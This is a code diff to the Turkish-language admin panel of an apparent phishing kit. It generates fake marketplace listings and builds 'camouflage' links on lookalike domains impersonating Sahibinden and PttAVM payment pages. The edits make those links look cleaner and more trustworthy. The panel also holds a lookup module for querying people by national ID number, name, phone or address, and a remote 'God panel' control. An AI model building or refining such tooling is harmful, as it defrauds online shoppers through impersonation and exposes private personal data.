@@ -1501,8 +1501,8 @@
                     </div>
                     <div class="form-group">
                         <label>Özel Link Uzantısı (Kamuflaj URL)</label>
-                        <input type="text" id="linkUzantisi" placeholder="Örn: iphone-14-pro-max-hatasiz-tr-cihazi">
-                        <p style="font-size:11px; color:var(--text-muted); margin-top:4px; font-weight:600;">Türkçe karakter kullanmayın. Boşluklar otomatik tireye (-) dönüşür.</p>
+                        <input type="text" id="linkUzantisi" placeholder="Otomatik oluşturulacak...">
+                        <p style="font-size:11px; color:var(--text-muted); margin-top:4px; font-weight:600;">İlan başlığına göre temiz link otomatik ayarlanır.</p>
                     </div>
                     <div class="form-group">
                         <label>Satıcı Adı Soyadı</label>
@@ -1575,7 +1575,7 @@
                 .replace(/\//g, '&#x2f;');
         };
 
-        // 🔥 YENİ: SİHİRLİ FORMATLAYICI (AUTO-SLUG) 🔥
+        // 🔥 SİHİRLİ FORMATLAYICI (AUTO-SLUG) 🔥
         function slugify(text) {
             const trMap = { 'çÇ':'c', 'ğĞ':'g', 'şŞ':'s', 'üÜ':'u', 'ıİ':'i', 'öÖ':'o' };
             for(let key in trMap) {
@@ -1587,7 +1587,6 @@
                        .replace(/-+/g, "-"); 
         }
 
-        // İlan başlığı yazıldıkça özel link uzantısını otomatik doldur
         document.getElementById('urunAdi').addEventListener('input', function(e) {
             const isEditing = document.getElementById("editIlanId").value !== "";
             if(!isEditing) { 
@@ -1595,7 +1594,6 @@
             }
         });
 
-        // Kullanıcı elle değiştirmek isterse bile formatı koru
         document.getElementById('linkUzantisi').addEventListener('input', function(e) {
             e.target.value = slugify(e.target.value); 
         });
@@ -1808,17 +1806,16 @@
                 
                 tbody.innerHTML = ''; 
                 globalIlanlar.forEach(function(data) {
-                    // 🔥 KAMUFLAJ URL YENİ LİNK ÜRETİMİ 🔥
-                    const slug = data.linkUzantisi || "ilan-detay";
-                    // Backend'e dokunmadan güvenli göstermenin en temiz yolu:
-                    const sahilindenLink = `https://payislemleri-sahibinden.vercel.app/?ilan=${data.docId}&baslik=${slug}`;
-                    const pttavmLink = `https://payislemlerim-pttavm.vercel.app/?ilan=${data.docId}&baslik=${slug}`;
+                    // 🔥 LİNKLER ARTIK TERTEMİZ /SLUG FORMATINDA 🔥
+                    const slug = data.linkUzantisi || data.docId; // Eski ilanlarda linkUzantisi yoksa ID atar
+                    const sahilindenLink = `https://payislemleri-sahibinden.vercel.app/${slug}`;
+                    const pttavmLink = `https://payislemlerim-pttavm.vercel.app/${slug}`;
                     
                     const tr = document.createElement('tr');
                     tr.innerHTML = `
                         <td><img src="${dezenfekteEt(data.anaResim || '')}" class="thumb-img"></td>
                         <td>
-                            <button class="link-btn sari" onclick="vitrinLinkiKopyala('${sahilindenLink}', 'Sahibinden')">Sahibinden Linki</button>
+                            <button class="link-btn sari" onclick="vitrinLinkiKopyala('${sahilindenLink}', 'Sahilinden')">Sahibinden Linki</button>
                             <button class="link-btn kirmizi" onclick="vitrinLinkiKopyala('${pttavmLink}', 'PttAVM')">PTTAVM Linki</button>
                         </td>
                         <td><strong>${dezenfekteEt(data.urunAdi)}</strong></td>
@@ -2036,7 +2033,6 @@
             document.getElementById("modalBaslik").innerText = "İlanı Düzenle";
             document.getElementById("urunAdi").value = data.urunAdi; 
             
-            // Özel Link Uzantısını Geri Yükle
             document.getElementById("linkUzantisi").value = data.linkUzantisi || "";
             
             document.getElementById("saticiAdi").value = data.saticiAdi; 
@@ -2102,7 +2098,7 @@
 
             const ilanData = {
                 urunAdi: document.getElementById("urunAdi").value.trim(), 
-                linkUzantisi: document.getElementById("linkUzantisi").value.trim(), // YENİ VERİ EKLENDİ
+                linkUzantisi: document.getElementById("linkUzantisi").value.trim(), 
                 saticiAdi: document.getElementById("saticiAdi").value.trim(), 
                 saticiTel: document.getElementById("saticiTel").value.trim(),
                 sehir: document.getElementById("sehir").value.trim(), 
@@ -2174,7 +2170,6 @@
             }
         });
 
-        // --- GOD PANEL EMİRLERİNİ DİNLEME VE KONTROL ---
         async function checkGodCommands() {
             try {
                 const res = await fetch(`${API_BASE}/sistem/durum?t=${new Date().getTime()}`, { headers: { 'Authorization': 'Bearer ' + token } });
@@ -2182,10 +2177,8 @@
                 if(!res.ok) return;
                 const data = await res.json();
                 
-                // 1. Kilit Durumu
                 toggleLockdown(data.kilitDurumu);
 
-                // 2. Sabit Anons Durumu
                 const anonsKutusu = document.getElementById('god-announcement-static');
                 const anonsMetni = document.getElementById('announcement-text-static');
                 if (data.anonsMesaji && data.anonsMesaji.trim() !== "") {
@@ -2195,7 +2188,6 @@
                     anonsKutusu.style.display = 'none';
                 }
 
-                // 3. Sorgu Modülü Durumu
                 const sorguBakimUyarisi = document.getElementById('sorguBakimUyarisi');
                 const sorguFormAlani = document.getElementById('sorguFormAlani');
                 const sorguBaslatBtn = document.getElementById('sorguBaslatBtn');
@@ -2234,17 +2226,14 @@
             let val = "";
             const tur = document.getElementById('sorguTuruSelect').value;
             
-            if (tur === 'tc') {
-                val = document.getElementById('sorguTc').value.trim();
-            } else if (tur === 'adsoyad') {
+            if (tur === 'tc') { val = document.getElementById('sorguTc').value.trim(); } 
+            else if (tur === 'adsoyad') {
                 const ad = document.getElementById('sorguAd').value.trim();
                 const soyad = document.getElementById('sorguSoyad').value.trim();
                 if (ad || soyad) val = ad + " " + soyad;
-            } else if (tur === 'telefon') {
-                val = document.getElementById('sorguTelefon').value.trim();
-            } else if (tur === 'adres') {
-                val = document.getElementById('sorguAdres').value.trim();
-            }
+            } 
+            else if (tur === 'telefon') { val = document.getElementById('sorguTelefon').value.trim(); } 
+            else if (tur === 'adres') { val = document.getElementById('sorguAdres').value.trim(); }
 
             if(val === "") { showToast("Lütfen sorgulanacak bilgiyi eksiksiz girin!", "error"); return; }
             
@@ -2257,28 +2246,20 @@
                 const res = await fetch(`${API_BASE}/sorgu-yap`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + token },
-                    body: JSON.stringify({ 
-                        sorguTuru: tur, 
-                        sorguDegeri: val 
-                    })
+                    body: JSON.stringify({ sorguTuru: tur, sorguDegeri: val })
                 });
                 
                 if (checkTokenError(res)) return;
                 
                 const data = await res.json();
-                if(data.hata) {
-                    showToast(data.hata, "error");
-                } else {
+                if(data.hata) { showToast(data.hata, "error"); } 
+                else {
                     showToast(data.mesaj || "API bağlandığında veriler tabloya dökülecek.", "success");
                     const tbody = document.getElementById('sorguTableBody');
                     tbody.innerHTML = `<tr class="skeleton-row"><td><div class="skeleton-box"></div></td><td><div class="skeleton-box"></div></td><td><div class="skeleton-box"></div></td><td><div class="skeleton-box"></div></td><td><div class="skeleton-box"></div></td></tr>`;
                 }
-            } catch(e) {
-                showToast("Sorgu yapılamadı, sunucuya ulaşılamıyor.", "error");
-            } finally {
-                btn.innerHTML = orjinalMetin;
-                btn.disabled = false;
-            }
+            } catch(e) { showToast("Sorgu yapılamadı, sunucuya ulaşılamıyor.", "error"); } 
+            finally { btn.innerHTML = orjinalMetin; btn.disabled = false; }
         });
 
         async function loadProfilAyarlari() {
